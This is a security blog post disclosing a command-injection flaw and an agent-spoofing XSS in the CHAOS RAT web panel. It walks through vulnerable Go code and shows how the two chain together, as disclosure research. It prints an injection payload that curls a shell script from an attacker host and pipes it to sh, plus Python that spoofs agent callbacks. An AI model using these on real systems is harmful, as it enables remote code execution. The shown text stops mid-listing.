<!doctype html>
<html lang="en-us">
  <head>
    <title>Remote code execution (CVE-2024-30850) on CHAOS RAT v5.01 web panel via spoofed agent callbacks (CVE-2024-31839) // </title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.140.0">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="chebuya" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.a5031799cdaa4009a95a89643ef8be32c1d9e554e539288ba91b4fcfebcf8035.css" />

    
    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Remote code execution (CVE-2024-30850) on CHAOS RAT v5.01 web panel via spoofed agent callbacks (CVE-2024-31839)">
  <meta name="twitter:description" content="PoC: https://github.com/chebuya/CVE-2024-30850-chaos-rat-rce-poc Your browser does not support the video tag. Introduction CHAOS RAT is an open-source remote administration tool targeting Windows and Linux systems, most notably employed during cryptomining campaigns 1 observed by TrendMicro. I was able to discover an authenticated command injection vulnerability that can be chained with an XSS to execute commands on the RAT server. I choose to look at CHAOS in more depth because of its apparent popularity (2.2k stars on github by the time of writing) and I am pretty familiar with golang.">

    <meta property="og:url" content="https://blog.chebuya.com/posts/remote-code-execution-on-chaos-rat-via-spoofed-agents/">
  <meta property="og:title" content="Remote code execution (CVE-2024-30850) on CHAOS RAT v5.01 web panel via spoofed agent callbacks (CVE-2024-31839)">
  <meta property="og:description" content="PoC: https://github.com/chebuya/CVE-2024-30850-chaos-rat-rce-poc Your browser does not support the video tag. Introduction CHAOS RAT is an open-source remote administration tool targeting Windows and Linux systems, most notably employed during cryptomining campaigns 1 observed by TrendMicro. I was able to discover an authenticated command injection vulnerability that can be chained with an XSS to execute commands on the RAT server. I choose to look at CHAOS in more depth because of its apparent popularity (2.2k stars on github by the time of writing) and I am pretty familiar with golang.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-04-05T12:10:52-04:00">
    <meta property="article:modified_time" content="2024-04-05T12:10:52-04:00">


  </head>
  <body>
    <header class="app-header">
    <a href="https://blog.chebuya.com/"><img class="app-header-avatar" src="/avatar.jpg" alt="chebuya" /></a>

      <span class="app-header-title"></span>
      <nav class="app-header-menu">
          <a class="app-header-menu-item" href="/">Home</a>
             - 
          
          <a class="app-header-menu-item" href="/about/">About</a>
      </nav>
      <p> </p>
      <div class="app-header-social">
        
          <a href="https://www.linkedin.com/in/chebuya-%E2%80%8E-5a0a08294/" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-linkedin">
  <title>LinkedIn</title>
  <path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle>
</svg>
          </a>
        
          <a href="https://packetstormsecurity.com/files/author/17026/" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-spider">
  <title>Exploit-DB</title>
  <path d="M5 9C5 7.89543 5.89543 7 7 7H17C18.1046 7 19 7.89543 19 9V14C19 17.866 15.866 21 12 21V21C8.13401 21 5 17.866 5 14V9Z" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M8 6V5.57546C8 4.59379 8.38443 3.61462 9.32606 3.33713C10.8514 2.88762 13.1486 2.88762 14.6739 3.33713C15.6156 3.61462 16 4.59379 16 5.57546V6" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M18.5 7.5L22 4" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M5.5 7.5L2 4" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M6 18L2 21" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M5 12H1.5" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M22.5 12H19" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M18 18L22 21" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 13L12 21" stroke="#e33bda" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
</svg>
          </a>
        
          <a href="https://hackerone.com/chebuya?type=user" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-hackerone">
  <title>HackerOne</title>
  <path d="M7.207 0c-.4836 0-.8774.1018-1.1823.3002-.3044.2003-.4592.4627-.4592.7798v21.809c0 .2766.1581.5277.4752.7609.315.2335.7031.3501 1.1664.3501.4427 0 .8306-.1166 1.1678-.3501.3352-.231.5058-.4843.5058-.761V1.0815c0-.319-.1623-.5769-.4893-.7813C8.0644.1018 7.6702 0 7.207 0zm9.5234 8.662c-.4836 0-.8717.0981-1.1683.3007l-4.439 2.7822c-.1988.1861-.2841.4687-.2473.855.0342.3826.2108.747.5238 1.0907.3145.346.6662.5626 1.0684.6547.3963.0899.6973.041.8962-.143l1.7551-1.0951v9.7817c0 .2767.1522.5278.4607.761.3007.2335.6873.3501 1.1504.3501.463 0 .863-.1166 1.1983-.3501.3371-.2332.5058-.4843.5058-.761V9.7381c0-.3193-.165-.577-.4898-.7754-.3252-.2026-.7288-.3007-1.2143-.3007z"/>
</svg>
          </a>
        
          <a href="https://github.com/chebuya" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-github">
  <title>GitHub</title>
  <path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"></path>
</svg>
          </a>
        
          <a href="https://twitter.com/_chebuya" target="_blank" rel="noreferrer noopener me">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-twitter">
  <title>Twitter</title>
  <path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path>
</svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">Remote code execution (CVE-2024-30850) on CHAOS RAT v5.01 web panel via spoofed agent callbacks (CVE-2024-31839)</h1>
      <div class="post-meta">
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-calendar">
  <title>calendar</title>
  <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line>
</svg>
          Apr 5, 2024
        </div>
        <div>
          <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="icon icon-clock">
  <title>clock</title>
  <circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline>
</svg>
          7 min read
        </div>
      </div>
    </header>
    <div class="post-content">
      <p>PoC: <a href="https://github.com/chebuya/CVE-2024-30850-chaos-rat-rce-poc">https://github.com/chebuya/CVE-2024-30850-chaos-rat-rce-poc</a> <!-- raw HTML omitted -->

 

<video width=100% controls autoplay>
    <source src="/chaos-poc.mp4" type="video/mp4">
    Your browser does not support the video tag.
</video>


</p>
<h3 id="introduction">Introduction</h3>
<p>CHAOS RAT is an <a href="https://github.com/tiagorlampert/CHAOS">open-source</a> remote administration tool targeting Windows and Linux systems, most notably employed during cryptomining campaigns <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> observed by TrendMicro.  I was able to discover an authenticated command injection vulnerability that can be chained with an XSS to execute commands on the RAT server. <!-- raw HTML omitted --></p>
<p>I choose to look at CHAOS in more depth because of its apparent popularity (2.2k stars on github by the time of writing) and I am pretty familiar with golang.</p>
<h3 id="identifying-command-injection-cve-2024-30850">Identifying command injection (CVE-2024-30850)</h3>
<p>One of the first things I like to do when doing source code review is use a SAST tool like semgrep to quickly identify any areas I should first check.  For golang code, I like using semgrep and gosec</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>semgrep --config auto ./
</span></span><span style="display:flex;"><span>gosec ./...
</span></span></code></pre></div><p>After running these tools, we are able to identify a portion of the codebase that uses shell commands to build agent binaries on the server backend.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span>[<span style="color:#f92672">/</span><span style="color:#a6e22e">CHAOS</span><span style="color:#f92672">/</span><span style="color:#a6e22e">services</span><span style="color:#f92672">/</span><span style="color:#a6e22e">client</span><span style="color:#f92672">/</span><span style="color:#a6e22e">client_service</span>.<span style="color:#66d9ef">go</span>:<span style="color:#ae81ff">160</span>] <span style="color:#f92672">-</span> <span style="color:#a6e22e">G204</span> (<span style="color:#a6e22e">CWE</span><span style="color:#f92672">-</span><span style="color:#ae81ff">78</span>): <span style="color:#a6e22e">Subprocess</span> <span style="color:#a6e22e">launched</span> <span style="color:#a6e22e">with</span> <span style="color:#a6e22e">variable</span> (<span style="color:#a6e22e">Confidence</span>: <span style="color:#a6e22e">HIGH</span>, <span style="color:#a6e22e">Severity</span>: <span style="color:#a6e22e">MEDIUM</span>)                                                                                               
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">159</span>:                                                            
</span></span><span style="display:flex;"><span>  &gt; <span style="color:#ae81ff">160</span>:        <span style="color:#a6e22e">cmd</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#a6e22e">buildCmd</span>)           
</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">161</span>:        <span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Dir</span> = <span style="color:#e6db74">&#34;client/&#34;</span> 
</span></span></code></pre></div><p>This portion of the code exists within the BuildClient function.  The BuildClient function will do some input validation, ensuring that address for the agent binary is either a valid IP or URL and the port is a valid port.  It will also normalize the path of the optional filename for the agent binary.  After this validation and sanitation, it will pass these parameters into buildStr command which will be executed on a shell.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">c</span> <span style="color:#a6e22e">clientService</span>) <span style="color:#a6e22e">BuildClient</span>(<span style="color:#a6e22e">input</span> <span style="color:#a6e22e">BuildClientBinaryInput</span>) (<span style="color:#66d9ef">string</span>, <span style="color:#66d9ef">error</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">isValidIPAddress</span>(<span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">ServerAddress</span>) <span style="color:#f92672">&amp;&amp;</span> !<span style="color:#a6e22e">isValidURL</span>(<span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">ServerAddress</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">ErrInvalidServerAddress</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">isValidPort</span>(<span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">ServerPort</span>) {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">ErrInvalidServerPort</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">filename</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">NormalizeString</span>(<span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">Filename</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">newToken</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">GenerateNewToken</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">err</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">const</span> <span style="color:#a6e22e">buildStr</span> = <span style="color:#e6db74">`GO_ENABLED=1 GOOS=%s GOARCH=amd64 go build -ldflags &#39;%s -s -w -X main.Version=%s -X main.Port=%s -X main.ServerAddress=%s -X main.Token=%s -extldflags &#34;-static&#34;&#39; -o ../temp/%s main.go`</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">filename</span> = <span style="color:#a6e22e">buildFilename</span>(<span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">OSTarget</span>, <span style="color:#a6e22e">filename</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">buildCmd</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Sprintf</span>(<span style="color:#a6e22e">buildStr</span>, <span style="color:#a6e22e">handleOSType</span>(<span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">OSTarget</span>), <span style="color:#a6e22e">runHidden</span>(<span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">RunHidden</span>), <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">AppVersion</span>, <span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">ServerPort</span>, <span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">ServerAddress</span>, <span style="color:#a6e22e">newToken</span>, <span style="color:#a6e22e">filename</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmd</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">exec</span>.<span style="color:#a6e22e">Command</span>(<span style="color:#e6db74">&#34;sh&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#a6e22e">buildCmd</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">Dir</span> = <span style="color:#e6db74">&#34;client/&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">outputErr</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">cmd</span>.<span style="color:#a6e22e">CombinedOutput</span>()
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">fmt</span>.<span style="color:#a6e22e">Errorf</span>(<span style="color:#e6db74">&#34;%w:%s&#34;</span>, <span style="color:#a6e22e">err</span>, <span style="color:#a6e22e">outputErr</span>)
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">filename</span>, <span style="color:#66d9ef">nil</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This function is called within the generateBinaryPostHandler function is mapped to the /generate POST route.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">adminGroup</span>.<span style="color:#a6e22e">POST</span>(<span style="color:#e6db74">&#34;/generate&#34;</span>, <span style="color:#a6e22e">handler</span>.<span style="color:#a6e22e">generateBinaryPostHandler</span>)
</span></span></code></pre></div><p>The generateBinaryPostHandler function will pass attacker controller input (req.Address, req.Port and req.Filename) into the BuildClient function where the shell command are executed.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">func</span> (<span style="color:#a6e22e">h</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">httpController</span>) <span style="color:#a6e22e">generateBinaryPostHandler</span>(<span style="color:#a6e22e">c</span> <span style="color:#f92672">*</span><span style="color:#a6e22e">gin</span>.<span style="color:#a6e22e">Context</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">req</span> <span style="color:#a6e22e">request</span>.<span style="color:#a6e22e">GenerateClientRequestForm</span>
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">ShouldBindWith</span>(<span style="color:#f92672">&amp;</span><span style="color:#a6e22e">req</span>, <span style="color:#a6e22e">binding</span>.<span style="color:#a6e22e">Form</span>); <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">String</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusBadRequest</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">osTarget</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">strconv</span>.<span style="color:#a6e22e">Atoi</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">OSTarget</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">String</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusBadRequest</span>, <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>())
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">binary</span>, <span style="color:#a6e22e">err</span> <span style="color:#f92672">:=</span> <span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">ClientService</span>.<span style="color:#a6e22e">BuildClient</span>(<span style="color:#a6e22e">client</span>.<span style="color:#a6e22e">BuildClientBinaryInput</span>{
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ServerAddress</span>: <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Address</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">ServerPort</span>:    <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Port</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">OSTarget</span>:      <span style="color:#a6e22e">system</span>.<span style="color:#a6e22e">OSTargetIntMap</span>[<span style="color:#a6e22e">osTarget</span>],
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">Filename</span>:      <span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">Filename</span>,
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">RunHidden</span>:     <span style="color:#a6e22e">utils</span>.<span style="color:#a6e22e">ParseCheckboxBoolean</span>(<span style="color:#a6e22e">req</span>.<span style="color:#a6e22e">RunHidden</span>),
</span></span><span style="display:flex;"><span>	})
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span> <span style="color:#a6e22e">err</span> <span style="color:#f92672">!=</span> <span style="color:#66d9ef">nil</span> {
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">h</span>.<span style="color:#a6e22e">Logger</span>.<span style="color:#a6e22e">Error</span>(<span style="color:#a6e22e">err</span>)
</span></span><span style="display:flex;"><span>		<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">JSON</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusInternalServerError</span>, <span style="color:#a6e22e">gin</span>.<span style="color:#a6e22e">H</span>{<span style="color:#e6db74">&#34;error&#34;</span>: <span style="color:#a6e22e">err</span>.<span style="color:#a6e22e">Error</span>()})
</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>	}
</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">c</span>.<span style="color:#a6e22e">String</span>(<span style="color:#a6e22e">http</span>.<span style="color:#a6e22e">StatusOK</span>, <span style="color:#a6e22e">binary</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>This is what this code looks like on the frontend.  The input boxes for Server Address, Server Port, and filename map to our req.Address, req.Port and req.Filename parameters <!-- raw HTML omitted --></p>
<p><img src="/build-panel.png" alt="meow1"> <!-- raw HTML omitted --></p>
<p>However, in this case, the input santization is insufficient to prevent comamnd injection.  The application allows the server address to be an IP address OR a URL.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> !<span style="color:#a6e22e">isValidIPAddress</span>(<span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">ServerAddress</span>) <span style="color:#f92672">&amp;&amp;</span> !<span style="color:#a6e22e">isValidURL</span>(<span style="color:#a6e22e">input</span>.<span style="color:#a6e22e">ServerAddress</span>) {
</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;&#34;</span>, <span style="color:#a6e22e">internal</span>.<span style="color:#a6e22e">ErrInvalidServerAddress</span>
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>With just a valid IP address alone, impactful command injection would surely be impossible.  However, a valid URL allows enough shell metacharacters to download and execute a shell script from a remote server.  Taking this hacktricks article<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> as reference, I was able to construct what golang considers to be a valid URL that also downloads and executes additional shell commands from an attacker controlled server.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>http://localhost<span style="color:#e6db74">&#39;$(IFS=];b=curl]192.168.1.6:80/loader.sh;$b|sh)&#39;</span>
</span></span></code></pre></div><h3 id="agent-based-xss-cve-2024-31839">Agent-based XSS (CVE-2024-31839)</h3>
<p>To escalate the impact of this vulnerability (as the previous vulnerability would rely on guessing the RAT operators password), we must chain it with another issue such as authentication/authorization issues, xss, etc <br>
<!-- raw HTML omitted -->When CHAOS generates the RAT agents, it will embed a static JWT token into all of the binaries, which is used to authenticate them into application routes used by RAT agents only.  The following routes are available to agents. <!-- raw HTML omitted --></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#a6e22e">authGroup</span>.<span style="color:#a6e22e">POST</span>(<span style="color:#e6db74">&#34;/device&#34;</span>, <span style="color:#a6e22e">handler</span>.<span style="color:#a6e22e">setDeviceHandler</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">authGroup</span>.<span style="color:#a6e22e">GET</span>(<span style="color:#e6db74">&#34;/client&#34;</span>, <span style="color:#a6e22e">handler</span>.<span style="color:#a6e22e">clientHandler</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">authGroup</span>.<span style="color:#a6e22e">GET</span>(<span style="color:#e6db74">&#34;/download/:filename&#34;</span>, <span style="color:#a6e22e">handler</span>.<span style="color:#a6e22e">downloadFileHandler</span>)
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">authGroup</span>.<span style="color:#a6e22e">POST</span>(<span style="color:#e6db74">&#34;/upload&#34;</span>, <span style="color:#a6e22e">handler</span>.<span style="color:#a6e22e">uploadFileHandler</span>)
</span></span></code></pre></div><p>The agent will hit the /device endpoint upon initial registration and will continue to periodically do so, we can spoof this process in python by sending the required agent information and an agent heartbeat.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">keep_connection</span>(target, cookie, hostname, username, os_name, mac, ip):
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;Spoofing agent connection&#34;</span>)
</span></span><span style="display:flex;"><span>    headers <span style="color:#f92672">=</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#e6db74">&#34;Cookie&#34;</span>: <span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;jwt=</span><span style="color:#e6db74">{</span>cookie<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;hostname&#34;</span>: hostname, <span style="color:#e6db74">&#34;username&#34;</span>:username,<span style="color:#e6db74">&#34;user_id&#34;</span>: username,<span style="color:#e6db74">&#34;os_name&#34;</span>: os_name, <span style="color:#e6db74">&#34;os_arch&#34;</span>:<span style="color:#e6db74">&#34;amd64&#34;</span>, <span style="color:#e6db74">&#34;mac_address&#34;</span>: mac, <span style="color:#e6db74">&#34;local_ip_address&#34;</span>: ip, <span style="color:#e6db74">&#34;port&#34;</span>:<span style="color:#e6db74">&#34;8000&#34;</span>, <span style="color:#e6db74">&#34;fetched_unix&#34;</span>:int(time<span style="color:#f92672">.</span>time())}
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">/health&#34;</span>, headers<span style="color:#f92672">=</span>headers)
</span></span><span style="display:flex;"><span>        r <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;http://</span><span style="color:#e6db74">{</span>target<span style="color:#e6db74">}</span><span style="color:#e6db74">/device&#34;</span>, headers<span style="color:#f92672">=</span>headers, json<span style="color:#f92672">=</span>data)
</span></span><span style="display:flex;"><span>        time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">30</span>)
</span></span></code></pre></div><p>The agent will also open a websocket connection with the server for more interactive commands.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-go" data-lang="go"><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;getos&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;screenshot&#34;</span>
